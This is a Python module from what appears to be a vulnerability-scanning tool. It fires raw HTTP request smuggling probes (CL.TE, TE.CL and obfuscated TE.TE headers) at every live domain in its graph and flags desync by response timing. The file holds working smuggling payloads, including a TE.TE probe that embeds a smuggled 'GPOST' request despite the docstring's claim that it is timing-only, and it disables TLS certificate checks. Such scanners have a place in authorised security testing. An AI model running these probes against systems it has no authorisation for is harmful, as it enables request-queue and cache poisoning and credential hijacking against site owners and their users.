"""
HTTP Request Smuggling Engine
Real CL.TE and TE.CL desync probes with timeout differential detection.

Technique:
  CL.TE: Front-end uses Content-Length, back-end uses Transfer-Encoding
  TE.CL: Front-end uses Transfer-Encoding, back-end uses Content-Length
  TE.TE: Both use Transfer-Encoding but back-end can be confused

Detection method:
  - Send ambiguous request with crafted CL + TE headers
  - Measure response timing differential
  - If back-end is desynced: subsequent innocent request returns poisoned response
  - Safe: never sends actual poisoned follow-up — timing only

Reference: PortSwigger Research (James Kettle)
"""
from __future__ import annotations
import asyncio
import logging
import time
from typing import Dict, List, Optional, Tuple

from argus.ontology.entities import Anomaly, EntityType, Severity
from argus.ontology.graph import KnowledgeGraph

logger = logging.getLogger("argus.intelligence.http_smuggling")

TIMEOUT_THRESHOLD_SECS = 8.0
NORMAL_TIMEOUT_SECS    = 5.0

CL_TE_PROBE = (
    b"POST / HTTP/1.1\r\n"
    b"Host: {host}\r\n"
    b"Content-Type: application/x-www-form-urlencoded\r\n"
    b"Content-Length: 6\r\n"
    b"Transfer-Encoding: chunked\r\n"
    b"Connection: keep-alive\r\n"
    b"\r\n"
    b"0\r\n"
    b"\r\n"
    b"X"
)

TE_CL_PROBE = (
    b"POST / HTTP/1.1\r\n"
    b"Host: {host}\r\n"
    b"Content-Type: application/x-www-form-urlencoded\r\n"
    b"Content-Length: 3\r\n"
    b"Transfer-Encoding: chunked\r\n"
    b"Connection: keep-alive\r\n"
    b"\r\n"
    b"8\r\n"
    b"SMUGGLED\r\n"
    b"0\r\n"
    b"\r\n"
)

TE_TE_PROBES = [

    b"Transfer-Encoding : chunked\r\n",

    b"Transfer-Encoding\t:\tchunked\r\n",

    b"Transfer-Encoding: chunked\r\nTransfer-Encoding: identity\r\n",

    b"transfer-encoding: chunked\r\n",

    b"X-Transfer-Encoding: chunked\r\nTransfer-Encoding: identity\r\n",
]

class HTTPSmugglingProbe:
    def __init__(self, graph: KnowledgeGraph, timeout: float = 10.0, concurrency: int = 10):
        self.graph       = graph
        self.timeout     = timeout
        self.concurrency = concurrency

    async def run(self) -> Dict[str, int]:
        """Run smuggling probes on all alive HTTPS domains."""
        alive = [
            d for d in self.graph.get_by_type(EntityType.DOMAIN)
            if d.properties.get("is_alive")
        ]

        sem = asyncio.Semaphore(self.concurrency)
        total_vuln = 0
        lock = asyncio.Lock()

        async def probe_one(domain_entity):
            nonlocal total_vuln
            async with sem:
                result = await self._probe(domain_entity)
                if result:
                    async with lock:
                        total_vuln += 1

        await asyncio.gather(*[probe_one(d) for d in alive], return_exceptions=True)
        return {"smuggling_candidates": total_vuln, "domains_probed": len(alive)}

    async def _probe(self, domain_entity) -> bool:
        """
        Run CL.TE and TE.CL probes.
        Uses timing differential: if probe takes significantly longer
        than normal, it indicates the back-end is waiting for more data
        (desync condition).
        """
        host = domain_entity.name
        port = 443 if domain_entity.properties.get("http_scheme", "https") == "https" else 80
        tls  = port == 443

        baseline = await self._timed_request(host, port, tls, self._build_normal_request(host))
        if baseline is None:
            return False

        found = False

        cl_te_time = await self._timed_request(
            host, port, tls,
            CL_TE_PROBE.replace(b"{host}", host.encode())
        )
        if cl_te_time is not None and cl_te_time > max(TIMEOUT_THRESHOLD_SECS, baseline * 3):
            found = True
            self.graph.penalize_entity(domain_entity.id, Anomaly(
                code="HTTP_REQUEST_SMUGGLING",
                title="HTTP Request Smuggling — CL.TE Desync Detected",
                detail=f"{host}: CL.TE probe caused {cl_te_time:.1f}s response delay "
                       f"(baseline: {baseline:.1f}s). Back-end likely uses Transfer-Encoding "
                       f"while front-end uses Content-Length. "
                       f"Allows request queue poisoning, cache poisoning, credential hijacking.",
                severity=Severity.CRITICAL,
                entity_id=domain_entity.id, entity_name=host,
            ))
            logger.warning(f"HTTP SMUGGLING CL.TE: {host} (delay: {cl_te_time:.1f}s vs baseline {baseline:.1f}s)")

        if not found:
            te_cl_time = await self._timed_request(
                host, port, tls,
                TE_CL_PROBE.replace(b"{host}", host.encode())
            )
            if te_cl_time is not None and te_cl_time > max(TIMEOUT_THRESHOLD_SECS, baseline * 3):
                found = True
                self.graph.penalize_entity(domain_entity.id, Anomaly(
                    code="HTTP_REQUEST_SMUGGLING",
                    title="HTTP Request Smuggling — TE.CL Desync Detected",
                    detail=f"{host}: TE.CL probe caused {te_cl_time:.1f}s response delay "
                           f"(baseline: {baseline:.1f}s). Front-end uses Transfer-Encoding, "
                           f"back-end uses Content-Length. "
                           f"Allows request queue poisoning and response splitting.",
                    severity=Severity.CRITICAL,
                    entity_id=domain_entity.id, entity_name=host,
                ))
                logger.warning(f"HTTP SMUGGLING TE.CL: {host} (delay: {te_cl_time:.1f}s)")

        if not found:
            for i, te_header in enumerate(TE_TE_PROBES[:3]):
                probe = self._build_te_te_probe(host, te_header)
                te_te_time = await self._timed_request(host, port, tls, probe)
                if te_te_time is not None and te_te_time > max(TIMEOUT_THRESHOLD_SECS, baseline * 3):
                    found = True
                    self.graph.penalize_entity(domain_entity.id, Anomaly(
                        code="HTTP_REQUEST_SMUGGLING",
                        title="HTTP Request Smuggling — TE.TE Obfuscation Detected",
                        detail=f"{host}: TE.TE obfuscation probe #{i+1} caused {te_te_time:.1f}s delay. "
                               f"Server accepts obfuscated Transfer-Encoding headers — "
                               f"potential for request desync via header manipulation.",
                        severity=Severity.HIGH,
                        entity_id=domain_entity.id, entity_name=host,
                    ))
                    break

        if found:
            domain_entity.properties["smuggling_vulnerable"] = True

        return found

    async def _timed_request(
        self, host: str, port: int, tls: bool, payload: bytes
    ) -> Optional[float]:
        """Send raw TCP request and measure response time."""
        start = time.monotonic()
        try:
            import ssl
            if tls:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode    = ssl.CERT_NONE
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(host, port, ssl=ctx, server_hostname=host),
                    timeout=self.timeout,
                )
            else:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(host, port),
                    timeout=self.timeout,
                )

            writer.write(payload)
            await writer.drain()

            try:
                data = await asyncio.wait_for(reader.read(4096), timeout=self.timeout)
            except (asyncio.TimeoutError, OSError):

                elapsed = time.monotonic() - start
                writer.close()
                return elapsed

            writer.close()
            try:
                await asyncio.wait_for(writer.wait_closed(), timeout=1.0)
            except Exception:
                pass

            return time.monotonic() - start

        except (asyncio.TimeoutError, OSError):
            return time.monotonic() - start
        except Exception as e:
            logger.debug(f"Smuggling probe error {host}:{port}: {e}")
            return None

    def _build_normal_request(self, host: str) -> bytes:
        """Standard GET request for baseline timing."""
        return (
            f"GET / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Connection: close\r\n"
            f"User-Agent: Mozilla/5.0\r\n"
            f"\r\n"
        ).encode()

    def _build_te_te_probe(self, host: str, te_header: bytes) -> bytes:
        """Build TE.TE obfuscation probe with custom Transfer-Encoding header."""
        header_section = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 4\r\n"
        ).encode()
        return (
            header_section
            + te_header
            + b"Connection: keep-alive\r\n"
            b"\r\n"
            b"5c\r\n"
            b"GPOST / HTTP/1.1\r\n"
            b"Content-Type: application/x-www-form-urlencoded\r\n"
            b"Content-Length: 15\r\n"
            b"\r\n"
            b"x=1\r\n"
            b"0\r\n\r\n"
        )
